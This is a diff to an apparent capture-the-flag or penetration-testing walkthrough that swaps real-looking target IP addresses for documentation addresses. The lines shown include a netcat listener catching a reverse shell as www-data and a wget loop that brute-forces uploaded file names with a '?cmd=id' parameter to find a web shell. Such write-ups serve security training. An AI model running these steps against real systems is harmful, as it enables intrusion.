@@ -150,7 +150,7 @@ review_status: imported-unreviewed
     ```bash
     $ nc -lvnp OUR_PORT
     listening on [any] OUR_PORT ...
-    connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
+    connect to [OUR_IP] from (UNKNOWN) [198.51.100.16] 35232
     # id
     uid=33(www-data) gid=33(www-data) groups=33(www-data)
     ```
@@ -505,7 +505,7 @@ review_status: imported-unreviewed
         
         ```bash
         for link in $(cat wordlist.txt); do
-             wget --delete-after <http://68.183.37.122:31662/profile_images/$link?cmd=id> | grep "200 OK"
+             wget --delete-after <http://198.51.100.11:31662/profile_images/$link?cmd=id> | grep "200 OK"
         done
         
         ```
